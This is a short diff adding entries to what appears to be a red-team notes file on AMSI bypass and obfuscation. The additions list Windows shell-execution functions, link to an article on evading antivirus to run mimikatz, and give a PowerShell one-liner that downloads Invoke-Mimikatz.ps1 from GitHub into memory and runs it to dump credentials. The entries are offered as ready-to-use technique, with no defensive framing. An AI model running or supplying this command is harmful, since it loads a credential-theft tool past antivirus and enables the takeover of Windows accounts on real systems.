@@ -50,6 +50,24 @@ amsi.fail
 https://github.com/danielbohannon/Invoke-Obfuscation
 
 
+# os shell commands
+
+cmd.exe, Process.Start, ShellExecuteA, WinExec, os.system
+
+cmd.exex is heavily protected
+
+# bypass anti virus run mimikatz
+
+https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
+
+```powershell
+powershell "IEX (New-Object Net.WebClient).DownloadString ('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz" 
+```
+
+
+
+
+
 
 
 
